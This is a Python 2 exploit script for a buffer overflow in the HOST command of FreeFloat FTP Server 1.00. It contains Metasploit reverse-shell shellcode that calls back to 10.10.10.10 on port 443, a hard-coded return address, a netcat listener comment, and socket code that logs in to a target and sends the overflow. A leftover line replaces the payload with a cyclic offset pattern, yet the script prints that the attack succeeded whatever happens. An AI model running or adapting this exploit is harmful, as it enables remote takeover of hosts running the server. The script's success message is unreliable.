#!/usr/bin/env python
#-*- coding: utf-8 -*-

# Exploit Title: FreeFloat FTP Server HOST Command Buffer Overflow Exploit
# Date: 30/10/2016
# Exploit Author: Cybernetic
# Software Link:  http://www.freefloat.com/software/freefloatftpserver.zip
# Version: 1.00
# Tested on: Windows XP Profesional SP3 ESP x86
# CVE : N/A

import socket, os, sys
ret="\xC7\x31\x6B\x7E" #Shell32.dll 7E6B31C7

#Metasploit Shellcode
#msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 -b '\x00\x0a\x0d' -f c

#nc -lvp 443
#Send exploit

shellcode=("\xbb\x89\x62\x48\xda\xdb\xda\xd9\x74\x24\xf4\x5a\x33\xc9\xb1"
"\x52\x31\x5a\x12\x03\x5a\x12\x83\x4b\x66\xaa\x2f\xb7\x8f\xa8"
"\xd0\x47\x50\xcd\x59\xa2\x61\xcd\x3e\xa7\xd2\xfd\x35\xe5\xde"
"\x76\x1b\x1d\x54\xfa\xb4\x12\xdd\xb1\xe2\x1d\xde\xea\xd7\x3c"
"\x5c\xf1\x0b\x9e\x5d\x3a\x5e\xdf\x9a\x27\x93\x8d\x73\x23\x06"
"\x21\xf7\x79\x9b\xca\x4b\x6f\x9b\x2f\x1b\x8e\x8a\xfe\x17\xc9"
"\x0c\x01\xfb\x61\x05\x19\x18\x4f\xdf\x92\xea\x3b\xde\x72\x23"
"\xc3\x4d\xbb\x8b\x36\x8f\xfc\x2c\xa9\xfa\xf4\x4e\x54\xfd\xc3"
"\x2d\x82\x88\xd7\x96\x41\x2a\x33\x26\x85\xad\xb0\x24\x62\xb9"
"\x9e\x28\x75\x6e\x95\x55\xfe\x91\x79\xdc\x44\xb6\x5d\x84\x1f"
"\xd7\xc4\x60\xf1\xe8\x16\xcb\xae\x4c\x5d\xe6\xbb\xfc\x3c\x6f"
"\x0f\xcd\xbe\x6f\x07\x46\xcd\x5d\x88\xfc\x59\xee\x41\xdb\x9e"
"\x11\x78\x9b\x30\xec\x83\xdc\x19\x2b\xd7\x8c\x31\x9a\x58\x47"
"\xc1\x23\x8d\xc8\x91\x8b\x7e\xa9\x41\x6c\x2f\x41\x8b\x63\x10"
"\x71\xb4\xa9\x39\x18\x4f\x3a\x86\x75\x4e\xde\x6e\x84\x50\x1f"
"\xd4\x01\xb6\x75\x3a\x44\x61\xe2\xa3\xcd\xf9\x93\x2c\xd8\x84"
"\x94\xa7\xef\x79\x5a\x40\x85\x69\x0b\xa0\xd0\xd3\x9a\xbf\xce"
"\x7b\x40\x2d\x95\x7b\x0f\x4e\x02\x2c\x58\xa0\x5b\xb8\x74\x9b"
"\xf5\xde\x84\x7d\x3d\x5a\x53\xbe\xc0\x63\x16\xfa\xe6\x73\xee"
"\x03\xa3\x27\xbe\x55\x7d\x91\x78\x0c\xcf\x4b\xd3\xe3\x99\x1b"
"\xa2\xcf\x19\x5d\xab\x05\xec\x81\x1a\xf0\xa9\xbe\x93\x94\x3d"
"\xc7\xc9\x04\xc1\x12\x4a\x34\x88\x3e\xfb\xdd\x55\xab\xb9\x83"
"\x65\x06\xfd\xbd\xe5\xa2\x7e\x3a\xf5\xc7\x7b\x06\xb1\x34\xf6"
"\x17\x54\x3a\xa5\x18\x7d")

pattern = "AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6AsLAshAs7AsMAsiAs8AsNAsjAs9AsOAskAsPAslAsQAsmAsRAsoAsSAspAsTAsqAsUAsrAsVAstAsWAsuAsXAsvAsYAswAsZAsxAsyAszAB%ABsABBAB$ABnABCAB-AB(ABDAB;AB)ABEABaAB0ABFABbAB1ABGABcAB2ABHABdAB3ABIABeAB4ABJABfAB5ABKABgAB6ABLABhAB7ABMABiAB8ABNABjAB9ABOABkABPABlABQABmABRABoABSABpABTABqABUABrABVABtABWABuABXABvABYABwABZABxAByABzA$%A$sA$BA$$A$nA$CA$-A$(A$DA$;A$)A$EA$aA$0A$FA$bA$1A$GA$cA$2A$HA$dA$3A$IA$eA$4A$JA$fA$5A$KA$gA$6A$LA$hA$7A$MA$iA$8A$NA$jA$9A$OA$kA$PA$lA$QA$mA$RA$oA$SA$pA$TA$qA$UA$rA$VA$tA$WA$uA$XA$vA$YA$wA$ZA$xA$yA$zAn%AnsAnBAn$AnnAnCAn-An(AnDAn;An)AnEAnaAn0AnFAnbAn1AnGAncAn2AnHAndAn3AnIAneAn4AnJAnfAn5AnKAngAn6AnLAnhAn7AnMAniAn8AnNAnjAn9AnOAnkAnPAnlAnQAnmAnRAnoAnSAnpAnTAnqAnUAnrAnVAntAnWAnuAnXAnvAnYAnwAnZAnxAnyAnzAC%ACsACBAC$ACnACCAC-AC(ACDAC;AC)ACEACaAC0ACFACbAC1ACGACcAC2ACHACdAC3ACIACeAC4ACJACfAC5ACKACgAC6ACLAChAC7ACMACiAC8ACNACjAC9ACOACkACPAClACQACmACRACoACSACpACTACqACUACrACVACtACWACuACXACvACYACwACZACxACyACzA-%A-sA-BA-$A-nA-CA--A-(A-DA-;A-)A-EA-aA-0A-FA-bA-1A-GA-cA-2A-HA-dA-3A-IA-eA-4A-JA-fA-5A-KA-gA-6A-LA-hA-7A-MA-iA-8A-NA-jA-9A-OA-kA-PA-lA-QA-mA-RA-oA-SA-pA-TA-qA-UA-rA-VA-tA-WA-uA-XA-vA-YA-wA-ZA-xA-yA-zA(%A(sA(BA($A(nA(CA(-A((A(DA(;A()A(EA(aA(0A(FA(bA(1A(GA(cA(2A(HA(dA(3A(IA(eA(4A(JA(fA(5A(KA(gA(6A(LA(hA(7A(MA(iA(8A(NA(jA(9A(OA(kA(PA(lA(QA(mA(RA(oA(SA(pA(TA(qA(UA(rA(VA(tA(WA(uA(XA(vA(YA(wA(ZA(xA(yA(zAD%ADsADBAD$ADnADCAD-AD(ADDAD;AD)ADEADaAD0ADFADbAD1ADGADcAD2ADHADdAD3ADIADeAD4ADJADfAD5ADKADgAD6ADLADhAD7ADMADiAD8ADNADjAD9ADOADkADPADlADQADmADRADoADSADpADTADqADUADrADVADtADWADuADXADvADYADwADZADxADyADzA;%A;sA;BA;$A;nA;CA;-A;(A;DA;;A;)A;EA"

shell= '\x90'*30 + shellcode
buffer='\x41'*247 + ret + shell + '\x43'*(696-len(shell))

buffer = pattern

print "Sending Buffer"

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect=s.connect(('10.5.9.2',21))
print s.recv(1024)
s.send('USER test \r\n')
s.recv(1024)
s.send('PASS test \r\n')
s.recv(1024)
s.send('HOST' +buffer+ '\r\n')
s.close()
print "Attack Buffer Overflow Successfully Executed"
